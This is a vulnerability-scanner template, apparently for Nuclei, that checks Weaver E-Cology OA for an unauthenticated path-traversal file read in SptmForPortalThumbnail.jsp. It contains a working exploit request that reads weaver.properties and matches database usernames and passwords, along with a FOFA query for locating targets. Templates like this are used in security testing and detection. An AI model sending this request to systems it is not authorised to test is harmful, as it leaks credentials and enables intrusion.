id: weaver-ecology-sptmforportalthumbnail-fileread

info:
  name: 泛微 OA E-Cology SptmForPortalThumbnail.jsp - fileread
  author: SleepingBag945、leadlife pr
  severity: high
  description: The controllable preview parameters of SptmForPortalThumbnail.jsp are not filtered and are directly spliced to the web root directory for file downloading.
  reference:
    - http://124.223.89.192/archives/e-cology8-14
    - https://github.com/GREENHAT7/pxplan/blob/main/xray_pocs/yaml-poc-weaver-weaver_e_cology_oa-readfile-CT-479157.yml
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="泛微-E-Weaver"
    hunter-query: todo
  tags: weaver,ecology,oa,fileread

http:
  - raw:
      - |
        GET /portal/SptmForPortalThumbnail.jsp?preview=../ecology/WEB-INF/prop/weaver.properties HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'ecology.user','ecology.password')
        condition: and